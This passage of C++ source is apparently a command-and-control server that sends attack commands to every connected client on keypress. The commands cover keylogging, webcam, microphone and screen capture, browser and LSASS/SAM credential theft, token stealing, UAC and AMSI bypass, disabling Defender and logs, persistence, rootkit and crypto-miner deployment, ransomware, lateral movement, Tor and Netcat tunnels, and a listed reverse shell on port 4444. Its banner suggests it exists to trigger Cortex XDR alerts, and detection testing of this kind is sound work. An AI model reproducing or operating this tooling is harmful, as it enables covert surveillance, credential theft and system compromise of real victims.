                        logActivity("C2", "COMMAND", "Keylogger start command sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] Keylogger start command sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // Keylogger dump (D key)
            else if (GetAsyncKeyState('D') & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: D - Dump Keylogger Data\033[0m\n";
                logActivity("*** MANUAL ***", "D_PRESSED", "Keylogger dump initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        std::string cmd = "CMD:keylogDump\n";
                        send(client.socket, cmd.c_str(), cmd.length(), 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "Keylogger dump command sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] Keylogger dump command sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // Webcam capture (W key)
            else if (GetAsyncKeyState('W') & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: W - Webcam Capture\033[0m\n";
                logActivity("*** MANUAL ***", "W_PRESSED", "Webcam capture initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        std::string cmd = "CMD:webcamCapture\n";
                        send(client.socket, cmd.c_str(), cmd.length(), 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "Webcam capture command sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] Webcam capture command sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // Browser credentials (B key)
            else if (GetAsyncKeyState('B') & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: B - Browser Credentials\033[0m\n";
                logActivity("*** MANUAL ***", "B_PRESSED", "Browser credential theft initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        std::string cmd = "CMD:browserCreds\n";
                        send(client.socket, cmd.c_str(), cmd.length(), 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "Browser creds command sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] Browser credentials command sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // Cached Credentials (C key)
            else if (GetAsyncKeyState('C') & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: C - Cached Credentials\033[0m\n";
                logActivity("*** MANUAL ***", "C_PRESSED", "Cached credentials extraction initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        std::string cmd = "CMD:cachedCreds\n";
                        send(client.socket, cmd.c_str(), cmd.length(), 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "Cached credentials command sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] Cached credentials command sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // Lateral Movement (L key)
            else if (GetAsyncKeyState('L') & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: L - Lateral Movement\033[0m\n";
                logActivity("*** MANUAL ***", "L_PRESSED", "Lateral movement initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        // Send multiple lateral movement commands
                        send(client.socket, "CMD:netDiscoveryCmd\n", 20, 0);
                        send(client.socket, "CMD:smbCmd\n", 11, 0);
                        send(client.socket, "CMD:wmiCmd\n", 11, 0);
                        send(client.socket, "CMD:psexecCmd\n", 14, 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "Lateral movement commands sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] Lateral movement commands sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // Exfiltrate Data (E key)
            else if (GetAsyncKeyState('E') & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: E - Exfiltrate Data\033[0m\n";
                logActivity("*** MANUAL ***", "E_PRESSED", "Data exfiltration initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        std::string cmd = "CMD:exfiltrateData\n";
                        send(client.socket, cmd.c_str(), cmd.length(), 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "Data exfiltration command sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] Data exfiltration command sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // UAC Bypass (U key)
            else if (GetAsyncKeyState('U') & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: U - UAC Bypass\033[0m\n";
                logActivity("*** MANUAL ***", "U_PRESSED", "UAC bypass initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        std::string cmd = "CMD:uacBypass\n";
                        send(client.socket, cmd.c_str(), cmd.length(), 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "UAC bypass command sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] UAC bypass command sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // Persistence (P key)
            else if (GetAsyncKeyState('P') & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: P - Install Persistence\033[0m\n";
                logActivity("*** MANUAL ***", "P_PRESSED", "Persistence installation initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        std::string cmd = "CMD:persistence\n";
                        send(client.socket, cmd.c_str(), cmd.length(), 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "Persistence command sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] Persistence command sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // Ransomware simulation (R key)
            else if (GetAsyncKeyState('R') & 0x8000) {
                std::cout << "\n\033[31m[!] MANUAL COMMAND TRIGGERED: R - Ransomware Simulation\033[0m\n";
                std::cout << "\033[33m[WARNING] This will encrypt test files in a controlled environment!\033[0m\n";
                logActivity("*** MANUAL ***", "R_PRESSED", "Ransomware simulation initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        std::string cmd = "CMD:ransomwareSimulation\n";
                        send(client.socket, cmd.c_str(), cmd.length(), 0);
                        targetCount++;
                        logActivity("C2", "RANSOMWARE", "Ransomware simulation command sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] Ransomware simulation command sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // Mimikatz (M key)
            else if (GetAsyncKeyState('M') & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: M - Mimikatz/LSASS Dump\033[0m\n";
                logActivity("*** MANUAL ***", "M_PRESSED", "Mimikatz/LSASS dump initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        std::string cmd = "CMD:dumpCreds\n";
                        send(client.socket, cmd.c_str(), cmd.length(), 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "Mimikatz command sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] Mimikatz/LSASS dump command sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // Network tunnels (N key)
            else if (GetAsyncKeyState('N') & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: N - Network Tunnels (SSH/Netcat/Socat/Cryptcat)\033[0m\n";
                std::cout << "\033[31m[WARNING] This will create REAL network processes and connections!\033[0m\n";
                logActivity("*** MANUAL ***", "N_PRESSED", "Network tunnels initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        send(client.socket, "CMD:sshCommand\n", 15, 0);
                        send(client.socket, "CMD:ncCommand\n", 14, 0);
                        send(client.socket, "CMD:socatCommand\n", 17, 0);
                        send(client.socket, "CMD:ccCommand\n", 14, 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "Network tunnel commands sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] 4 network commands sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // TOR Connect (T key)
            else if (GetAsyncKeyState('T') & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: T - TOR Connect\033[0m\n";
                logActivity("*** MANUAL ***", "T_PRESSED", "TOR connection initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        std::string cmd = "CMD:torCommand\n";
                        send(client.socket, cmd.c_str(), cmd.length(), 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "TOR command sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] TOR connect command sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // F1 - System Info
            else if (GetAsyncKeyState(VK_F1) & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: F1 - Full System Info\033[0m\n";
                logActivity("*** MANUAL ***", "F1_PRESSED", "System info collection initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        std::string cmd = "CMD:sysinfo\n";
                        send(client.socket, cmd.c_str(), cmd.length(), 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "System info command sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] System info command sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // F2 - Process Hollowing
            else if (GetAsyncKeyState(VK_F2) & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: F2 - Process Hollowing\033[0m\n";
                logActivity("*** MANUAL ***", "F2_PRESSED", "Process hollowing initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        std::string cmd = "CMD:processHollow\n";
                        send(client.socket, cmd.c_str(), cmd.length(), 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "Process hollowing command sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] Process hollowing command sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // F3 - Microphone Recording
            else if (GetAsyncKeyState(VK_F3) & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: F3 - Microphone Recording\033[0m\n";
                logActivity("*** MANUAL ***", "F3_PRESSED", "Microphone recording initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        std::string cmd = "CMD:micRecord\n";
                        send(client.socket, cmd.c_str(), cmd.length(), 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "Microphone recording command sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] Microphone recording command sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // F4 - Clipboard Capture
            else if (GetAsyncKeyState(VK_F4) & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: F4 - Clipboard Capture\033[0m\n";
                logActivity("*** MANUAL ***", "F4_PRESSED", "Clipboard capture initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        std::string cmd = "CMD:clipboardCapture\n";
                        send(client.socket, cmd.c_str(), cmd.length(), 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "Clipboard capture command sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] Clipboard capture command sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // F5 - File Search
            else if (GetAsyncKeyState(VK_F5) & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: F5 - File Search\033[0m\n";
                std::cout << "\033[36m[INPUT] Enter search pattern (filename or wildcard): \033[0m";
                
                std::string searchPattern;
                std::getline(std::cin, searchPattern);
                
                if (!searchPattern.empty()) {
                    logActivity("*** MANUAL ***", "F5_PRESSED", "File search initiated for: " + searchPattern);
                    
                    int targetCount = 0;
                    std::lock_guard<std::mutex> lock(clientsMutex);
                    for (const auto& [id, client] : connectedClients) {
                        if (client.isActive) {
                            std::string cmd = "CMD:fileSearch:" + searchPattern + "\n";
                            send(client.socket, cmd.c_str(), cmd.length(), 0);
                            targetCount++;
                            logActivity("C2", "COMMAND", "File search command sent to " + id + " for: " + searchPattern);
                        }
                    }
                    
                    std::cout << "\033[32m[+] File search command sent to " << targetCount << " active client(s)\033[0m\n";
                }
                Sleep(200);
            }
            
            // F6 - Screen Recording
            else if (GetAsyncKeyState(VK_F6) & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: F6 - Screen Recording\033[0m\n";
                logActivity("*** MANUAL ***", "F6_PRESSED", "Screen recording initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        std::string cmd = "CMD:screenRecord\n";
                        send(client.socket, cmd.c_str(), cmd.length(), 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "Screen recording command sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] Screen recording command sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // F7 - Token Stealing
            else if (GetAsyncKeyState(VK_F7) & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: F7 - Token Stealing\033[0m\n";
                logActivity("*** MANUAL ***", "F7_PRESSED", "Token stealing initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        std::string cmd = "CMD:tokenSteal\n";
                        send(client.socket, cmd.c_str(), cmd.length(), 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "Token stealing command sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] Token stealing command sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // F8 - SAM Dump
            else if (GetAsyncKeyState(VK_F8) & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: F8 - SAM Dump\033[0m\n";
                logActivity("*** MANUAL ***", "F8_PRESSED", "SAM dump initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        std::string cmd = "CMD:samDump\n";
                        send(client.socket, cmd.c_str(), cmd.length(), 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "SAM dump command sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] SAM dump command sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // F9 - Install Rootkit
            else if (GetAsyncKeyState(VK_F9) & 0x8000) {
                std::cout << "\n\033[31m[!] MANUAL COMMAND TRIGGERED: F9 - Install Rootkit\033[0m\n";
                std::cout << "\033[33m[WARNING] This will simulate rootkit installation!\033[0m\n";
                logActivity("*** MANUAL ***", "F9_PRESSED", "Rootkit installation initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        std::string cmd = "CMD:installRootkit\n";
                        send(client.socket, cmd.c_str(), cmd.length(), 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "Rootkit installation command sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] Rootkit installation command sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // F10 - Deploy Crypto Miner
            else if (GetAsyncKeyState(VK_F10) & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: F10 - Deploy Crypto Miner\033[0m\n";
                logActivity("*** MANUAL ***", "F10_PRESSED", "Crypto miner deployment initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        std::string cmd = "CMD:deployCryptoMiner\n";
                        send(client.socket, cmd.c_str(), cmd.length(), 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "Crypto miner deployment command sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] Crypto miner deployment command sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // F11 - Cloud Upload
            else if (GetAsyncKeyState(VK_F11) & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: F11 - Cloud Upload\033[0m\n";
                logActivity("*** MANUAL ***", "F11_PRESSED", "Cloud upload initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        std::string cmd = "CMD:cloudUpload\n";
                        send(client.socket, cmd.c_str(), cmd.length(), 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "Cloud upload command sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] Cloud upload command sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // F12 - Remote Desktop
            else if (GetAsyncKeyState(VK_F12) & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: F12 - Remote Desktop\033[0m\n";
                logActivity("*** MANUAL ***", "F12_PRESSED", "Remote desktop access initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        std::string cmd = "CMD:enableRDP\n";
                        send(client.socket, cmd.c_str(), cmd.length(), 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "RDP enable command sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] Remote desktop command sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // Attack Phase 1 (1 key)
            else if (GetAsyncKeyState('1') & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: 1 - Phase 1: Initial Reconnaissance\033[0m\n";
                logActivity("*** MANUAL ***", "1_PRESSED", "Phase 1 attack initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        // Send multiple recon commands
                        send(client.socket, "CMD:sysinfo\n", 12, 0);
                        send(client.socket, "CMD:netDiscoveryCmd\n", 20, 0);
                        send(client.socket, "CMD:domainCmd\n", 14, 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "Phase 1 commands sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] Phase 1 attack sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // Attack Phase 2 (2 key)
            else if (GetAsyncKeyState('2') & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: 2 - Phase 2: Privilege Escalation\033[0m\n";
                logActivity("*** MANUAL ***", "2_PRESSED", "Phase 2 privilege escalation initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        // Send privilege escalation commands
                        send(client.socket, "CMD:uacBypass\n", 14, 0);
                        send(client.socket, "CMD:tokenSteal\n", 15, 0);
                        send(client.socket, "CMD:elevatePrivs\n", 17, 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "Phase 2 privilege escalation commands sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] Phase 2 attack sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // Attack Phase 3 (3 key)
            else if (GetAsyncKeyState('3') & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: 3 - Phase 3: Defense Evasion\033[0m\n";
                logActivity("*** MANUAL ***", "3_PRESSED", "Phase 3 defense evasion initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        // Send defense evasion commands
                        send(client.socket, "CMD:amsiBypass\n", 15, 0);
                        send(client.socket, "CMD:etwDisable\n", 15, 0);
                        send(client.socket, "CMD:defenderDisable\n", 19, 0);
                        send(client.socket, "CMD:clearLogs\n", 14, 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "Phase 3 defense evasion commands sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] Phase 3 attack sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // Attack Phase 4 (4 key)
            else if (GetAsyncKeyState('4') & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: 4 - Phase 4: Credential Access & Surveillance\033[0m\n";
                logActivity("*** MANUAL ***", "4_PRESSED", "Phase 4 credential access initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        // Send credential access commands
                        send(client.socket, "CMD:dumpCreds\n", 14, 0);
                        send(client.socket, "CMD:keylogStart\n", 16, 0);
                        send(client.socket, "CMD:screenshot\n", 15, 0);
                        send(client.socket, "CMD:browserCmd\n", 15, 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "Phase 4 credential & surveillance commands sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] Phase 4 attack sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // Attack Phase 5 (5 key)
            else if (GetAsyncKeyState('5') & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: 5 - Phase 5: Lateral Movement & Persistence\033[0m\n";
                logActivity("*** MANUAL ***", "5_PRESSED", "Phase 5 lateral movement & persistence initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        // Send lateral movement & persistence commands
                        send(client.socket, "CMD:persistence\n", 16, 0);
                        send(client.socket, "CMD:smbCmd\n", 11, 0);
                        send(client.socket, "CMD:wmiCmd\n", 11, 0);
                        send(client.socket, "CMD:torCommand\n", 15, 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "Phase 5 lateral movement & persistence commands sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] Phase 5 attack sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // C2 Communication Behaviors (6 key)
            else if (GetAsyncKeyState('6') & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: 6 - C2 Communication Behaviors\033[0m\n";
                std::cout << "\033[31m[WARNING] This will create multiple suspicious C2 communication patterns!\033[0m\n";
                logActivity("*** MANUAL ***", "6_PRESSED", "Advanced C2 behaviors initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        // Send C2 behavior command
                        std::string cmd = "CMD:c2Behaviors\n";
                        send(client.socket, cmd.c_str(), cmd.length(), 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "C2 behavior command sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] C2 behavior command sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // XDR Detection Functions (7 key)
            else if (GetAsyncKeyState('7') & 0x8000) {
                std::cout << "\n\033[31m[!] MANUAL COMMAND TRIGGERED: 7 - XDR Detection Functions (15 Alerts)\033[0m\n";
                std::cout << "\033[33m[WARNING] This will trigger 15 specific XDR detection alerts!\033[0m\n";
                std::cout << "\033[33m[INFO] Alerts will include:\033[0m\n";
                std::cout << "  1. PowerShell from temp directory\n";
                std::cout << "  2. Windows Firewall disabled via Registry\n";
                std::cout << "  3. Clear event logging with auditpol.exe\n";
                std::cout << "  4. Service enumeration from public IPs\n";
                std::cout << "  5. Rundll32 spawning suspicious processes\n";
                std::cout << "  6. Document discovery with find command\n";
                std::cout << "  7. Registry SAM/SECURITY/SYSTEM save\n";
                std::cout << "  8. PowerShell reverse shell on port 4444\n";
                std::cout << "  9. Rundll32 with ordinal numbers\n";
                std::cout << "  10. Socat/Netcat to TOR domains\n";
                std::cout << "  11. UAC bypass via Event Viewer\n";
                std::cout << "  12. Multiple RDP sessions via Registry\n";
                std::cout << "  13. Rundll32 with 'main' EntryPoint\n";
                std::cout << "  14. Dumping lsass with procdump\n";
                std::cout << "  15. Add user to admin group with PowerShell\n";
                
                logActivity("*** MANUAL ***", "7_PRESSED", "XDR detection functions initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        // Send XDR detection command
                        std::string cmd = "CMD:xdrDetection\n";
                        send(client.socket, cmd.c_str(), cmd.length(), 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "XDR detection command sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] XDR detection command sent to " << targetCount << " active client(s)\033[0m\n";
                std::cout << "\033[31m[!] Expect 15 XDR alerts to be triggered!\033[0m\n";
                Sleep(200);
            }
            
            // XDR High/Medium Detection Functions (8 key)
            else if (GetAsyncKeyState('8') & 0x8000) {
                std::cout << "\n\033[31m[!] MANUAL COMMAND TRIGGERED: 8 - XDR High/Medium Alerts (10 Detections)\033[0m\n";
                std::cout << "\033[33m[WARNING] This will trigger 10 high/medium severity XDR alerts!\033[0m\n";
                std::cout << "\033[33m[INFO] Alerts will include:\033[0m\n";
                std::cout << "  1. Copy process memory file (dd utility)\n";
                std::cout << "  2. PowerShell removing mailbox export logs\n";
                std::cout << "  3. API call from Tor exit node\n";
                std::cout << "  4. Rundll32 with no arguments\n";
                std::cout << "  5. Credential dumping via LaZagne\n";
                std::cout << "  6. Delete Windows Shadow Copies\n";
                std::cout << "  7. EventLog service disabled\n";
                std::cout << "  8. Encoded VBScript execution\n";
                std::cout << "  9. Suspicious exe in .NET directory\n";
                std::cout << "  10. Windows logon text changed\n";
                
                logActivity("*** MANUAL ***", "8_PRESSED", "XDR high/medium detection functions initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        // Send XDR high/medium detection command
                        std::string cmd = "CMD:xdrHighMedium\n";
                        send(client.socket, cmd.c_str(), cmd.length(), 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "XDR high/medium detection command sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] XDR high/medium detection command sent to " << targetCount << " active client(s)\033[0m\n";
                std::cout << "\033[31m[!] Expect 10 high/medium XDR alerts to be triggered!\033[0m\n";
                Sleep(200);
            }
            
            // Periodic debug message
            keyboardCheckCounter++;
            if (keyboardCheckCounter % 500 == 0) { // Every 5 seconds (10ms * 500)
                std::cout << "\033[36m[DEBUG] Keyboard monitoring active... Press 'H' for help\033[0m" << std::endl;
            }
            
            // Sleep to avoid busy waiting
            Sleep(10);
        }

        // Cleanup
        logActivity("C2", "CLEANUP", "Shutting down C2 infrastructure");
        
        // Shutdown server job system
        shutdownServerJobSystem();

        closesocket(listenSocket);

        // Wait for threads
        if (dashboard.joinable()) dashboard.join();
        // if (dnsThread.joinable()) dnsThread.join();
        if (campaignThread.joinable()) campaignThread.join();
        if (reverseShellListener.joinable()) reverseShellListener.join();
        if (rdpHijacker.joinable()) rdpHijacker.join();

        for (auto& thread : clientThreads) {
            if (thread.joinable()) thread.join();
        }

        // Close all client connections
        {
            std::lock_guard<std::mutex> lock(clientsMutex);
            for (auto& [id, client] : connectedClients) {
                if (client.socket != INVALID_SOCKET) {
                    closesocket(client.socket);
                }
            }
        }

        WSACleanup();

        std::cout << "\n\033[32m"; // Green
        std::cout << "+================================================================+\n";
        std::cout << "|                   C2 SERVER SHUTDOWN COMPLETE                  |\n";
        std::cout << "|                                                                |\n";
        std::cout << "|  Attack logs saved to: C:\\temp\\                               |\n";
        std::cout << "|  - c2_server_detailed.log                                     |\n";
        std::cout << "|  - attack_timeline.log                                        |\n";
        std::cout << "|                                                                |\n";
        std::cout << "|  Check Cortex XDR console for comprehensive alerts!           |\n";
        std::cout << "+================================================================+\n";
        std::cout << "\033[0m\n"; // Reset

        std::cout << "Press any key to exit...\n";
        std::cin.get();
    }
    
    // Main function with command line parsing
    int main(int argc, char* argv[]) {
        // Initialize Winsock
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            std::cerr << "Failed to initialize Winsock" << std::endl;
            return 1;
        }
        
        // Parse command line arguments
        if (argc < 2) {
            std::cout << "Usage: " << argv[0] << " [server|client] [options]" << std::endl;
